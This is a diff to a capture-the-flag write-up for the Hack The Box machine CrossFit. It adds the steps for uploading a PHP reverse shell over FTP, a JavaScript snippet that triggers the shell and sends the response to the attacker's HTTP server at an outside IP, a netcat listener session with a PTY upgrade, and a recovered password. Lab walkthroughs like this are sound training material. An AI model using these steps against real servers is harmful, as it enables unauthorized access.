@@ -758,19 +758,91 @@ $factory->define(User::class, function (Faker $faker) {
 
 /ftp/database/factories password hash cracked to reveal ... 'password'
 
-Note: something is missing here...getting initial connection back, finding and cracking the hash...
+```text
+lftp test3@ftp.crossfit.htb:/> ls
+drwxrwxr-x    2 33       1002         4096 Mar 21 21:45 development-test
+drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
+drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
+drwxr-xr-x    2 0        0            4096 May 01  2020 html
+```
 
+While I was looking at the folder permissions, I realized that the permissions for `/development-test` allowed for writing to the directory.
 
+```text
+lftp test3@ftp.crossfit.htb:/> ls
+drwxrwxr-x    2 33       1002         4096 Mar 21 21:45 development-test
+drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
+drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
+drwxr-xr-x    2 0        0            4096 May 01  2020 html
+lftp test3@ftp.crossfit.htb:/> cd dev
+cd: Access failed: 550 Failed to change directory. (/dev)
+lftp test3@ftp.crossfit.htb:/> cd development-test/
+lftp test3@ftp.crossfit.htb:/development-test> put ~/php-reverse-shell.php 
+5495 bytes transferred
+```
+```
 
 can PUT files, upload php backdoor
 
-enumerate a bit, create reverse shell as http-user
+```javascript
+//get and run reverse shell
+//
+var test = "http://development-test.crossfit.htb/php-reverse-shell.php";
+var request1 = new XMLHttpRequest();
+request1.open('GET', test, false);
+request1.send()
+var response1 = request1.responseText;
+
+var request2 = new XMLHttpRequest();
+//send response1 to my waiting python http.server 
+request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
+request2.send()
+
+```
+
+Created another script to run my reverse shell
+
+```text
+10.10.10.208 - - [21/Mar/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
+```
+
+Got a connection...
+
+## Initial Foothold
+
+```text
+┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+└─$ script initial-foothold                                                                         1 ⨯
+Script started, output log file is 'initial-foothold'.
+┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+└─$ bash                                                             
+zweilos@kalimaa:~/htb/crossfit$ nc -lvnp 8091
+listening on [any] 8091 ...
+connect to [10.10.14.161] from (UNKNOWN) [10.10.10.208] 60548
+Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+ 22:51:04 up 2 days,  9:01,  0 users,  load average: 1.78, 2.11, 2.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
+www-data@crossfit:/$ ^Z
+[1]+  Stopped                 nc -lvnp 8091
+zweilos@kalimaa:~/htb/crossfit$ stty size
+54 104
+zweilos@kalimaa:~/htb/crossfit$ stty raw -echo
+nc -lvnp 8091aa:~/htb/crossfit$ 
+
+www-data@crossfit:/$ stty rows 54 columns 104
+www-data@crossfit:/$ export TERM=xterm-256color
+```
+
+And got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  used bash because zsh problem
+
+enumerate a bit
 
 found `adduser-hank.yml` in `/ansible` directory with hash -&gt; `hank:powerpuffgirls`
 
 
-
-## Initial Foothold
 
 ```bash
 root:x:0:0:root:/root:/bin/bash
